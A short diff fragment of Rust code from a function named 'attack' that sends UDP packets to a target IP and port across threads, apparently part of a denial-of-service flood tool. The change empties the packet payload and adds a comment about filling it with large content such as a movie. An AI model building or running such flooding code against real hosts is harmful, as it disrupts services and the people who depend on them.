@@ -113,7 +113,8 @@ async fn attack(target_ip: String, target_port: u16, thread_id: u32) {
 
         match UdpSocket::bind(&local_addr).await {
             Ok(socket) => {
-                let data_to_send: &[u8] = b"Hello, server!";
+                let data_to_send: &[u8] = b"";
+                // add like a movie or sum as the packet contents.
 
                 match socket.send_to(data_to_send, &addr.parse::<SocketAddrV4>().expect("Invalid target address")).await {
                     Ok(_) => println!("Packet sent: {} on thread: {}", i, thread_id),
